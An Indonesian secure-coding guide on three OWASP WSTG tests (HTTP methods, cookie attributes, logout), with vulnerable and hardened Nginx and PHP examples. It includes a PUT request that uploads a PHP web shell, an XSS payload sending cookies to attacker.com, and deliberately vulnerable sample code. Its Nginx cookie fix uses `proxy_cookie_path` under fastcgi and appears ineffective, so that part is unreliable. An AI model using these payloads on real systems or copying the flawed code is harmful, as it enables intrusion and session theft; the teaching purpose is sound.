## 1. WSTG-CONF-06: Test HTTP Methods

**Penjelasan:**
Kerentanan ini terjadi ketika server web atau aplikasi mengizinkan metode HTTP yang berbahaya (seperti `PUT`, `DELETE`, atau `TRACE`) yang tidak diperlukan oleh aplikasi. Jika tidak dibatasi, penyerang dapat mengunggah file berbahaya (Web Shell), menghapus file penting, atau melakukan serangan *Cross-Site Tracing* (XST) menggunakan `TRACE`.

**Contoh Eksploitasi Praktikal:**
Penyerang mengirimkan *request* `OPTIONS` ke server untuk melihat metode apa saja yang diizinkan. Jika server merespons dengan `Allow: GET, POST, PUT, DELETE, OPTIONS`, penyerang akan menggunakan metode `PUT` untuk mengunggah *backdoor*.

```http
PUT /uploads/shell.php HTTP/1.1
Host: target.com

<?php system($_GET['cmd']); ?>

```

### Konfigurasi Nginx

**Versi Rentan (Tidak ada pembatasan metode):**

```nginx
server {
    listen 80;
    server_name example.com;
    root /var/www/html;

    location / {
        # Semua HTTP methods (GET, POST, PUT, DELETE, TRACE) diterima
        try_files $uri $uri/ /index.php?$query_string;
    }
}

```

**Versi Aman (Hanya izinkan GET, POST, dan HEAD):**

```nginx
server {
    listen 80;
    server_name example.com;
    root /var/www/html;

    location / {
        # Tolak semua metode selain GET, HEAD, dan POST
        limit_except GET HEAD POST {
            deny all;
        }
        try_files $uri $uri/ /index.php?$query_string;
    }
}

```

### Kode PHP

Walaupun pembatasan di level Nginx sudah cukup, validasi di level aplikasi juga merupakan *defense-in-depth* yang baik.

**Versi Rentan (`upload.php` asal terima metode):**

```php
<?php
// Menerima request PUT secara langsung dan menyimpan file
if ($_SERVER['REQUEST_METHOD'] === 'PUT') {
    $data = file_get_contents("php://input");
    file_put_contents("uploaded_file.php", $data);
    echo "File uploaded via PUT!";
}
?>

```

**Versi Aman (`upload.php` memblokir metode tidak sah):**

```php
<?php
$allowed_methods = ['GET', 'POST'];

if (!in_array($_SERVER['REQUEST_METHOD'], $allowed_methods)) {
    http_response_code(405); // Method Not Allowed
    die("Error 405: Method Not Allowed.");
}

// Proses hanya jika GET atau POST...
echo "Metode aman, memproses request.";
?>

```

## 2. WSTG-SESS-02: Test for Cookies Attributes

**Penjelasan:**
Saat aplikasi membuat *session cookie*, cookie tersebut harus dilindungi dengan atribut keamanan: `HttpOnly` (mencegah akses via JavaScript/XSS), `Secure` (memaksa pengiriman hanya via HTTPS), dan `SameSite` (mencegah *Cross-Site Request Forgery* / CSRF).

**Contoh Eksploitasi Praktikal:**
Jika cookie sesi tidak memiliki *flag* `HttpOnly`, penyerang yang menemukan celah XSS (Cross-Site Scripting) dapat menyuntikkan *payload* JavaScript berikut untuk mencuri cookie admin:

```html
<script>
    fetch('http://attacker.com/steal?cookie=' + btoa(document.cookie));
</script>

```

### Kode PHP

Konfigurasi atribut cookie paling ideal dilakukan di level aplikasi (PHP) saat sesi dimulai.

**Versi Rentan (Atribut default/hilang):**

```php
<?php
// Memulai sesi tanpa mengatur atribut keamanan cookie
session_start();
$_SESSION['user'] = 'admin';

// Atau menggunakan setcookie tanpa flag
setcookie("auth_token", "super_secret_token");
echo "Berhasil login! Cookie rentan telah diset.";
?>

```

**Versi Aman (Dengan HttpOnly, Secure, dan SameSite):**

```php
<?php
// Konfigurasi cookie parameter SEBELUM session_start()
session_set_cookie_params([
    'lifetime' => 3600,
    'path' => '/',
    'domain' => 'example.com',
    'secure' => true,      // Hanya dikirim lewat HTTPS
    'httponly' => true,    // Tidak bisa diakses via JavaScript
    'samesite' => 'Strict' // Mencegah pengiriman via request lintas situs (CSRF)
]);

session_start();
$_SESSION['user'] = 'admin';
echo "Berhasil login! Cookie aman telah diset.";
?>

```

### Konfigurasi Nginx

Selain PHP, kita bisa memaksa (*override*) Nginx untuk menambahkan atribut ini jika aplikasi lama tidak bisa diubah kodenya.

**Versi Rentan:**

```nginx
# Tidak ada modifikasi header Set-Cookie
location ~ \.php$ {
    fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
    include fastcgi_params;
}

```

**Versi Aman (Memaksa penambahan atribut via Nginx):**

```nginx
location ~ \.php$ {
    fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
    include fastcgi_params;
    
    # Memaksa penambahan Secure, HttpOnly, dan SameSite pada header cookie keluaran PHP
    proxy_cookie_path / "/; HTTPOnly; Secure; SameSite=strict";
}

```

## 3. WSTG-SESS-06: Test for Session Logout Management

**Penjelasan:**
Fitur *logout* yang aman tidak hanya menghapus cookie di sisi peramban (klien), tetapi juga harus menghancurkan (*destroy*) data sesi secara fisik di sisi server. Selain itu, halaman yang membutuhkan autentikasi tidak boleh di-cache oleh peramban agar tidak bisa diakses via tombol "Back" setelah pengguna *logout*.

**Contoh Eksploitasi Praktikal:**
Pengguna A login, mendapatkan *Session ID* `12345`. Pengguna A mengklik *logout*. Aplikasi hanya menghapus cookie di *browser*, tapi di server sesi `12345` masih aktif. Penyerang yang sebelumnya menyadap/mendapatkan *Session ID* `12345` tersebut memasukkannya ke peramban mereka dan masih bisa mengakses akun Pengguna A tanpa harus memasukkan *password*.

### Kode PHP

**Versi Rentan (Hanya menghapus cookie di klien):**

```php
<?php
session_start();

// HANYA menghapus cookie di browser, tapi $_SESSION di server masih ada!
setcookie(session_name(), '', time() - 3600, '/');

// Redirect ke login
header("Location: login.php");
exit;
?>

```

**Versi Aman (Menghancurkan sesi sepenuhnya):**

```php
<?php
session_start();

// 1. Hapus semua variabel sesi di memori
$_SESSION = array();

// 2. Hancurkan cookie sesi di sisi klien
if (ini_get("session.use_cookies")) {
    $params = session_get_cookie_params();
    setcookie(session_name(), '', time() - 42000,
        $params["path"], $params["domain"],
        $params["secure"], $params["httponly"]
    );
}

// 3. Hancurkan sesi di file system server
session_destroy();

// Redirect ke login
header("Location: login.php");
exit;
?>

```

### Konfigurasi Nginx

Untuk *Logout Management*, masalah lain yang sering terjadi adalah *browser caching*. Jika tidak ada *Cache-Control*, pengguna bisa menekan tombol `Back` di browser setelah *logout* dan melihat data sensitif.

**Versi Rentan:**

```nginx
server {
    # Nginx akan menggunakan caching browser default,
    # halaman sensitif mungkin tersimpan di history browser.
}

```

**Versi Aman (Menambahkan Cache-Control):**

```nginx
server {
    # ...
    
    # Mencegah browser menyimpan halaman sensitif setelah logout
    add_header Cache-Control "no-store, no-cache, must-revalidate, max-age=0";
    add_header Pragma "no-cache";
    add_header Expires "0";

    location ~ \.php$ {
        fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
        include fastcgi_params;
    }
}

```

---

Dengan mengombinasikan perbaikan di level server (Nginx) dan di level aplikasi (PHP), postur keamanan aplikasi Anda akan menjadi sangat kuat secara *defense-in-depth*.
